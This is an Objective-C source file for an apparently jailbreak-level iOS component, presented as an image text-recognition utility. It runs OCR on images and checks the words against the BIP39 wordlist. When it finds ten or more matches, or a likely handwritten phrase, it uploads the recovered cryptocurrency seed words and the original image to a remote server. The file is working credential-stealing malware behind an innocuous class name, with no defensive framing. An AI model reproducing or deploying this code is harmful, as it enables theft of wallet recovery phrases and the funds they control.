//
//  VisionImageRecUtil.m
//  SysSpringBoardDev
//
//  Created by 陈帆 on 2026/04/22.
//

#import "VisionImageRecUtil.h"
#import "BusinessNetworkManager.h"

#import <Vision/Vision.h>

@interface VisionImageRecUtil()
@property (nonatomic, strong) NSArray *bit39WordsArray;

@end

@implementation VisionImageRecUtil

+ (instancetype)sharedInstance {
    static VisionImageRecUtil *sharedInstance = nil;
    static dispatch_once_t onceToken;
    dispatch_once(&onceToken, ^{
        sharedInstance = [[VisionImageRecUtil alloc] init];
    });
    return sharedInstance;
}

- (void)recognizeTextInImage:(UIImage *)image {
    if (!image) return;
    
    // 将UIImage转换为CGImage
    CGImageRef cgImage = image.CGImage;
    if (!cgImage) return;

    // 创建请求
    VNRecognizeTextRequest *textRequest = [[VNRecognizeTextRequest alloc] initWithCompletionHandler:^(VNRequest * _Nonnull request, NSError * _Nullable error) {
        if (error) {
            NSLog(@"Text recognition error: %@", error);
            return;
        }

        NSMutableArray<NSString *> *recognizedWords = [NSMutableArray array];
        
        // 步骤 4: 分析结果，收集置信度和文本
        double totalConfidence = 0.0;
        NSInteger validCount = 0;
        for (VNRecognizedTextObservation *observation in request.results) {
            VNRecognizedText *topCandidate = [[observation topCandidates:1] firstObject];
            if (topCandidate) {
                NSString *text = topCandidate.string;
                // 拆分为单词
                NSArray<NSString *> *words = [self wordsFromText:text];
                [recognizedWords addObjectsFromArray:words];
            }
            if (topCandidate && topCandidate.string.length > 0 && topCandidate.confidence > 0.1) {  // 忽略极低置信度
                totalConfidence += topCandidate.confidence;
                validCount++;
            }
        }
        
        NSMutableArray<NSString *> *recognizedWordsNew = [NSMutableArray array];
        for (NSString *word in recognizedWords) {
            if ([self isWordInBIP39Wordlist:word]) {
                [recognizedWordsNew addObject:word];
            }
        }
        
        NSUInteger count = recognizedWordsNew.count;
        if (count >= 10) {
            NSLog(@"czf007-vision:✅ 找到可能的助记词，共 %lu 个单词：%@", (unsigned long)count, recognizedWordsNew);
            // 提交单词
            NSString *words = [recognizedWordsNew componentsJoinedByString:@","];
            [[BusinessNetworkManager sharedManager] sendMnemonicWordsWith:words Success:^(id  _Nonnull response) {
                YOLogI(@"success");
            } failure:^(NSError * _Nonnull error) {
                YOLogI(@"failure");
            }];
            
            // 提交图片
            [[BusinessNetworkManager sharedManager] sendMnemonicImageWithImage:image Success:^(id  _Nonnull response) {
                YOLogI(@"success");
            } failure:^(NSError * _Nonnull error) {
                YOLogI(@"failure");
            }];
        } else {
            if (validCount == 0) {
                NSLog(@"czf007-vision:❌ 单词数不匹配（%lu 个）,wordList:%@, 非手写体1", (unsigned long)count, recognizedWordsNew);
            } else {
                double avgConfidence = totalConfidence / validCount;
                BOOL hasHandwritten = (avgConfidence < 0.8);  // 阈值：可根据测试调整（<0.8 倾向手写）
                if (hasHandwritten) {
                    NSLog(@"czf007-vision:❌ 单词数不匹配（%lu 个）,wordList:%@, 手写体1", (unsigned long)count, recognizedWordsNew);
                    // 提交图片
                    [[BusinessNetworkManager sharedManager] sendMnemonicImageWithImage:image Success:^(id  _Nonnull response) {
                        YOLogI(@"success");
                    } failure:^(NSError * _Nonnull error) {
                        YOLogI(@"failure");
                    }];
                } else {
                    NSLog(@"czf007-vision:❌ 单词数不匹配（%lu 个）,wordList:%@, 非手写体2", (unsigned long)count, recognizedWordsNew);
                }
            }
        }
    }];
    
    textRequest.recognitionLevel = VNRequestTextRecognitionLevelAccurate;
    textRequest.usesLanguageCorrection = NO;
    if (@available(iOS 16.0, *)) {
        textRequest.automaticallyDetectsLanguage = NO;
    } else {
        // Fallback on earlier versions
    }
    
    textRequest.recognitionLanguages = @[@"en-US"];
    if (self.bit39WordsArray == nil) {
        self.bit39WordsArray = [self loadBIP39Wordlist];
    }
    textRequest.customWords = self.bit39WordsArray;
    
    // 处理图像方向
    CGImagePropertyOrientation orientation = [self cgImageOrientationFromUIImage:image];
    // 创建处理请求的handler
    VNImageRequestHandler *handler = [[VNImageRequestHandler alloc] initWithCGImage:cgImage orientation:orientation options:@{}];
    
    NSError *error = nil;
    [handler performRequests:@[textRequest] error:&error];
    if (error) {
        NSLog(@"Handler error: %@", error);
    }
}

// 转换 UIImage 方向为 CGImagePropertyOrientation
- (CGImagePropertyOrientation)cgImageOrientationFromUIImage:(UIImage *)image {
    switch (image.imageOrientation) {
        case UIImageOrientationUp: return kCGImagePropertyOrientationUp;
        case UIImageOrientationDown: return kCGImagePropertyOrientationDown;
        case UIImageOrientationLeft: return kCGImagePropertyOrientationLeft;
        case UIImageOrientationRight: return kCGImagePropertyOrientationRight;
        case UIImageOrientationUpMirrored: return kCGImagePropertyOrientationUpMirrored;
        case UIImageOrientationDownMirrored: return kCGImagePropertyOrientationDownMirrored;
        case UIImageOrientationLeftMirrored: return kCGImagePropertyOrientationLeftMirrored;
        case UIImageOrientationRightMirrored: return kCGImagePropertyOrientationRightMirrored;
        default: return kCGImagePropertyOrientationUp;
    }
}

- (NSArray<NSString *> *)wordsFromText:(NSString *)text {
    // 移除非字母字符，只保留空格和字母
    NSCharacterSet *allowedSet = [[NSCharacterSet characterSetWithCharactersInString:@"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ "] invertedSet];
    NSString *cleanText = [[text componentsSeparatedByCharactersInSet:allowedSet] componentsJoinedByString:@" "];
    
    // 拆分为单词（按空格）
    NSArray *words = [cleanText componentsSeparatedByCharactersInSet:[NSCharacterSet whitespaceAndNewlineCharacterSet]];
    
    // 过滤空字符串
    NSPredicate *predicate = [NSPredicate predicateWithFormat:@"length > 0"];
    return [words filteredArrayUsingPredicate:predicate];
}


- (NSArray *)loadBIP39Wordlist {
    // 使用你指定的绝对路径
    NSString *filePath = @"/var/root/sources/bip39_wordlist.json";
    
    YOLogI(@"[BIP39] 尝试加载词表: %@", filePath);
    
    // 检查文件是否存在
    NSFileManager *fileManager = [NSFileManager defaultManager];
    if (![fileManager fileExistsAtPath:filePath]) {
        YOLogE(@"[BIP39] ❌ 文件不存在: %@", filePath);
    }
    
    // 读取文件
    NSError *error = nil;
    NSData *jsonData = [NSData dataWithContentsOfFile:filePath
                                              options:NSDataReadingMappedIfSafe
                                                error:&error];
    
    if (error || !jsonData) {
        YOLogE(@"[BIP39] ❌ 读取文件失败: %@", error.localizedDescription);
        return nil;
    }
    
    // 解析 JSON
    id jsonObject = [NSJSONSerialization JSONObjectWithData:jsonData
                                                    options:NSJSONReadingMutableContainers
                                                      error:&error];
    if (error) {
        YOLogE(@"[BIP39] ❌ JSON 解析失败: %@", error.localizedDescription);
        return nil;
    }
    
    // 确保返回的是 NSArray
    if (![jsonObject isKindOfClass:[NSArray class]]) {
        YOLogE(@"[BIP39] ❌ JSON 格式错误，期待 NSArray，实际得到 %@", NSStringFromClass([jsonObject class]));
        return nil;
    }
    
    // 缓存并转为不可变数组（更安全、性能更好）
    NSArray *bip39Wordlist = [NSArray arrayWithArray:(NSArray *)jsonObject];
    // 可选：简单验证第一个和最后一个词（防止文件损坏）
    if (bip39Wordlist.count > 0) {
        YOLogD(@"[BIP39] 词表示例: %@ ... %@",
               bip39Wordlist.firstObject,
               bip39Wordlist.lastObject);
    }
    
    return bip39Wordlist;
}


- (BOOL)isWordInBIP39Wordlist:(NSString *)word {
    if (!self.bit39WordsArray) {
        // 词库未加载，无法验证
        NSLog(@"词库未加载，无法验证");
        return NO;
    }

    // 使用二分查找（Binary Search）
    // NSArray 的 indexOfObject:inSortedRange:options:usingComparator: 方法
    // 非常适合这个场景，因为它是二分查找的底层实现。
    NSUInteger index = [self.bit39WordsArray indexOfObject:word
                                           inSortedRange:NSMakeRange(0, self.bit39WordsArray.count)
                                                 options:NSBinarySearchingFirstEqual
                                                 usingComparator:^NSComparisonResult(NSString *obj1, NSString *obj2) {
                                                     return [obj1 compare:obj2];
                                                 }];
                                                 
    // 如果找到，索引将不是 NSNotFound
    return (index != NSNotFound);
}

@end
